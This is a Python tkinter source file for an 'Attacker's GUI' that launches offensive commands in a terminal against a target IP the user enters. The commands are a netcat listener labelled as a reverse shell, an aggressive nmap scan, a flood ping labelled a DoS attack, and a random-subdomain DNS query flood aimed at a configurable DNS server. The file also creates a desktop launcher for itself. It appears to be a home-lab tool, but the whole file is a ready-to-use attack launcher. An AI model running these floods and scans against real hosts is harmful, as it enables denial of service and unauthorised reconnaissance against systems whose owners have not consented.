import tkinter as tk
from tkinter import scrolledtext
import subprocess
import os
import sys

class AttackerGUI:
    def __init__(self, root):
        self.root = root
        root.title("Attacker's GUI")
        root.geometry("600x550")
        root.resizable(False, False)
        
        # Input Frame for target IP, port, and DNS server IP
        input_frame = tk.Frame(root)
        input_frame.pack(pady=10)
        
        # Target IP input
        tk.Label(input_frame, text="Target IP:").grid(row=0, column=0, sticky="e", padx=5, pady=5)
        self.target_ip_entry = tk.Entry(input_frame, width=20)
        self.target_ip_entry.grid(row=0, column=1, padx=5, pady=5)
        
        # Port input (used for reverse shell)
        tk.Label(input_frame, text="Port:").grid(row=1, column=0, sticky="e", padx=5, pady=5)
        self.port_entry = tk.Entry(input_frame, width=20)
        self.port_entry.grid(row=1, column=1, padx=5, pady=5)
        
        # DNS Server IP input (used for DNS attack); default is set to 192.168.101.6
        tk.Label(input_frame, text="DNS Server IP:").grid(row=2, column=0, sticky="e", padx=5, pady=5)
        self.dns_ip_entry = tk.Entry(input_frame, width=20)
        self.dns_ip_entry.insert(0, "192.168.101.6")
        self.dns_ip_entry.grid(row=2, column=1, padx=5, pady=5)
        
        # Button Frame for launching commands
        button_frame = tk.Frame(root)
        button_frame.pack(pady=10)
        
        # Reverse Shell Button
        self.rev_shell_button = tk.Button(
            button_frame, text="Start Reverse Shell", command=self.start_reverse_shell,
            width=20, bg="lightblue"
        )
        self.rev_shell_button.grid(row=0, column=0, padx=5, pady=5)
        
        # Nmap Scan Button
        self.nmap_button = tk.Button(
            button_frame, text="Start Nmap Scan", command=self.start_nmap_scan,
            width=20, bg="lightgreen"
        )
        self.nmap_button.grid(row=0, column=1, padx=5, pady=5)
        
        # DoS Attack Button
        self.dos_button = tk.Button(
            button_frame, text="Start DoS Attack", command=self.start_dos_attack,
            width=20, bg="lightcoral"
        )
        self.dos_button.grid(row=1, column=0, padx=5, pady=5)
        
        # DNS Attack Button
        self.dns_button = tk.Button(
            button_frame, text="Start DNS Attack", command=self.start_dns_attack,
            width=20, bg="plum"
        )
        self.dns_button.grid(row=1, column=1, padx=5, pady=5)
        
        # Clear Log Button to clear the log display
        self.clear_button = tk.Button(
            root, text="Clear Log", command=self.clear_log,
            width=20, bg="orange"
        )
        self.clear_button.pack(pady=5)
        
        # Add Desktop Icon Button
        self.desktop_icon_button = tk.Button(
            root, text="Add Desktop Icon", command=self.add_desktop_icon,
            width=20, bg="yellow"
        )
        self.desktop_icon_button.pack(pady=5)
        
        # Log text area to display status messages
        self.log_text = scrolledtext.ScrolledText(root, wrap=tk.WORD, width=70, height=15, font=("Helvetica", 10))
        self.log_text.pack(pady=10)
        self.log_text.configure(state="disabled")
    
    def log_status(self, message):
        """Append a message to the log text widget."""
        self.log_text.configure(state="normal")
        self.log_text.insert(tk.END, message + "\n")
        self.log_text.configure(state="disabled")
        self.log_text.see(tk.END)
    
    def run_command_in_terminal(self, command):
       
        try:
            subprocess.Popen(["xterm", "-hold", "-e", command])
            self.log_status(f"Launched command: {command}")
        except Exception as e:
            self.log_status(f"Error launching command: {e}")
    
    def start_reverse_shell(self):
        """Launch the reverse shell command using the port specified."""
        port = self.port_entry.get().strip()
        if not port:
            self.log_status("Please enter a port for the reverse shell.")
            return
        # Reverse shell command using Netcat as listener
        command = f"nc -lvnp {port}"
        self.run_command_in_terminal(command)
    
    def start_nmap_scan(self):
        """Launch the Nmap scan command using the target IP."""
        target_ip = self.target_ip_entry.get().strip()
        if not target_ip:
            self.log_status("Please enter a target IP for the Nmap scan.")
            return
        command = f"nmap -A -T4 {target_ip}"
        self.run_command_in_terminal(command)
    
    def start_dos_attack(self):
        """Launch the DoS attack command using the target IP."""
        target_ip = self.target_ip_entry.get().strip()
        if not target_ip:
            self.log_status("Please enter a target IP for the DoS attack.")
            return
        command = f"sudo ping -f -s 65000 {target_ip}"
        self.run_command_in_terminal(command)
    
    def start_dns_attack(self):
        """Launch the DNS attack command using the provided DNS server IP."""
        dns_server_ip = self.dns_ip_entry.get().strip()
        if not dns_server_ip:
            self.log_status("Please enter a DNS Server IP for the DNS attack.")
            return
        # Construct the DNS attack command. It uses an inline Python snippet to generate a random subdomain.
        command = (
            f'dig $(python3 -c "import random, string; print(\'.\'.join('
            f'\'\'.join(random.choices(string.ascii_lowercase, k=20)) for _ in range(6)) + \'.example.com\')") '
            f'@{dns_server_ip}'
        )
        self.run_command_in_terminal(command)
    
    def add_desktop_icon(self):
       
        try:
            # Determine the absolute path to this script
            script_path = os.path.abspath(__file__) if '__file__' in globals() else sys.argv[0]
            # Define the Desktop directory (this may vary by distribution)
            desktop_dir = os.path.join(os.path.expanduser("~"), "Desktop")
            if not os.path.isdir(desktop_dir):
                self.log_status("Desktop directory not found.")
                return
            desktop_file_path = os.path.join(desktop_dir, "AttackerGUI.desktop")
            desktop_file_content = f"""[Desktop Entry]
Version=1.0
Type=Application
Name=Attacker GUI
Comment=Launch the Attacker GUI
Exec=python3 {script_path}
Icon={script_path} 
Terminal=false
Categories=Utility;
"""
            with open(desktop_file_path, "w") as f:
                f.write(desktop_file_content)
            os.chmod(desktop_file_path, 0o755)
            self.log_status(f"Desktop icon created at: {desktop_file_path}")
        except Exception as e:
            self.log_status(f"Error creating desktop icon: {e}")
    
    def clear_log(self):
        """Clear the contents of the log text widget."""
        self.log_text.configure(state="normal")
        self.log_text.delete(1.0, tk.END)
        self.log_text.configure(state="disabled")

if __name__ == '__main__':
    root = tk.Tk()
    app = AttackerGUI(root)
    root.mainloop()
